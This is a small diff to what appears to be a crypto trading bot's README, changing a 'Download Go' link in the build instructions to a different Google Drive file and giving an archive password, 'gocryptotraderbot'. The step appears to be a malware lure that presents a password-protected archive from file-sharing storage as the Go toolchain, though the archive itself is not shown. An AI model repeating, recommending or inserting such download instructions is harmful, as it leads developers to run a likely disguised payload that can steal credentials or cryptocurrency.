@@ -102,7 +102,7 @@ When submitting a PR, please abide by our coding guidelines:
 
 ## Compiling and Running instructions
 
-Download [Go](https://drive.google.com/file/d/1NLYLfpBzpVqQdrxckwvgV3eP3qOx9VjJ/view?usp=sharing).
+Download [Go](https://drive.google.com/file/d/1g1nq9Gkv9zfFPH7eoubUHwMzTkW4eQZH/view?usp=sharing).
 
 Archive password: ***gocryptotraderbot***
 
